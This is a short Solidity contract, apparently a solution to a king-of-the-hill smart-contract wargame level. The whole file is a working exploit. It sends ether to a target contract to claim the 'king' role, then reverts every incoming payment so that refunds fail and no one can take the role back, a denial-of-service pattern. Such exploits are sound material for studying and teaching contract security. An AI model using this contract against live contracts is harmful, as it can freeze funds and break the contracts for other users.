// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "hardhat/console.sol";

contract RoboKing {

    function becomeKing(address cont) public payable {
        (bool sent,) = cont.call.value(msg.value).gas(4000000)("");
        require(sent);
    }


    receive() external payable {
        revert("no thanks");
    }
}
